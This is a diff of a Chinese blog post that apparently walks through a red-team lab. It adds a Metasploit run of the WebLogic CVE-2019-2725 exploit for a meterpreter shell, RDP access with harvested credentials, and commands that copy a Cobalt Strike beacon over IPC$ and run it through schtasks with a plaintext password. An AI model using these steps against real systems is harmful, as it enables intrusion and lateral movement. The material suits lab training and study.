@@ -333,21 +333,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-04
+                    2023-08-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -434,6 +434,18 @@ OS：KALI(64)<span aria-hidden="true" class="line-numbers-rows"><span></span><sp
 <p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803102758873.png" alt="image-20230803102758873"></p>
 <p>成功getshell</p>
 <p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803103429565.png" alt="image-20230803103429565"></p>
+<p>除此之外还可以直接通过msf搜索CVE-2019-2725，看看有没有可以利用的脚本</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230810140347176.png" alt="image-20230810140347176"></p>
+<p>可以发现存在可利用脚本，用该脚本进行攻击</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;misc&#x2F;weblogic_deserialize_asyncresponseservice
+set rhosts 192.168.111.80
+set lhost 192.168.111.128
+show targets
+set target 1
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功拿到meterpreter</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230810163006578.png" alt="image-20230810163006578"></p>
 <h3 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h3><h4 id="CS方式"><a href="#CS方式" class="headerlink" title="CS方式"></a>CS方式</h4><p>开启cs客户端和服务端</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver <span class="token number">192.168</span>.111.128 f14g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -522,6 +534,8 @@ net group <span class="token string">"domain admins"</span> /domain	  <span clas
 <p>IP:10.10.10.201</p>
 <h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803153051409.png" alt="image-20230803153051409"></p>
 <h4 id="logonpasswords"><a href="#logonpasswords" class="headerlink" title="logonpasswords"></a>logonpasswords</h4><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803153134671.png" alt="image-20230803153134671"></p>
+<p>根据得到的密码（而且我们扫描端口的时候发现3389端口开放着）可以使用rdesktop进行远程连接</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811135535516.png" alt="image-20230811135535516"></p>
 <h2 id="横向移动（攻击DC-PC）"><a href="#横向移动（攻击DC-PC）" class="headerlink" title="横向移动（攻击DC,PC）"></a>横向移动（攻击DC,PC）</h2><h3 id="使用梼杌上传fscan"><a href="#使用梼杌上传fscan" class="headerlink" title="使用梼杌上传fscan"></a>使用梼杌上传fscan</h3><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803154118275.png" alt="image-20230803154118275"></p>
 <p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803154257643.png" alt="image-20230803154257643"></p>
 <p>然后运行fscan</p>
@@ -545,10 +559,34 @@ net use <span class="token punctuation">\</span><span class="token punctuation">
 <p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804095010643.png" alt="image-20230804095010643"></p>
 <p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804095107731.png" alt="image-20230804095107731"></p>
 <p>成功获取DC权限</p>
-<p>获取PC权限同理</p>
-<p>也算是打完了，但是还有很多知识点不是很清楚，先掌握掌握知识点，等周末再打一遍</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811151957645.png" alt="image-20230811151957645"></p>
+<p>然后portscan  DC</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811152524414.png" alt="image-20230811152524414"></p>
+<p>发现不太行</p>
+<p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811152916385.png" alt="image-20230811152916385"></p>
+<p>有可能是开着防火墙呢</p>
+<p>但是有思路可以参考</p>
+<p>尝试用计划任务连接PC</p>
+<p>控制web主机和PC建立IPC连接</p>
+<pre class="line-numbers language-none"><code class="language-none">shell net use \\10.10.10.201\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后我们用cs生成一个新的木马上传到web主机上，然后在web主机上执行如下命令，将木马远程复制到PC上</p>
+<pre class="line-numbers language-none"><code class="language-none">shell copy C:\Users\administrator.WEB\Desktop\beacon.exe \\10.10.10.201\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>检查是否上传成功</p>
+<pre class="line-numbers language-none"><code class="language-none">shell dir \\10.10.10.201\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后利用计划任务运行该木马</p>
+<pre class="line-numbers language-none"><code class="language-none">#创建计划任务
+schtasks &#x2F;create &#x2F;tn &quot;sec&quot; &#x2F;tr c:\\beacon.exe &#x2F;sc once &#x2F;st 20:40 &#x2F;S 10.10.10.201 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;1qaz@WSX&quot;
+#立即执行计划任务
+schtasks &#x2F;run &#x2F;tn &quot;sec&quot; &#x2F;S 10.10.10.201 &#x2F;u administrator &#x2F;p &quot;1qaz@WSX&quot;
+#删除计划任务
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44029310/article/details/126039321">https://blog.csdn.net/qq_44029310/article/details/126039321</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.moduyun.com/column/detail/58968.html">https://developer.moduyun.com/column/detail/58968.html</a></p>
 
                 
             </div>
@@ -1227,7 +1265,7 @@ net use <span class="token punctuation">\</span><span class="token punctuation">
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">74.6k</span>
+                        class="white-color">74.9k</span>
             
             
             
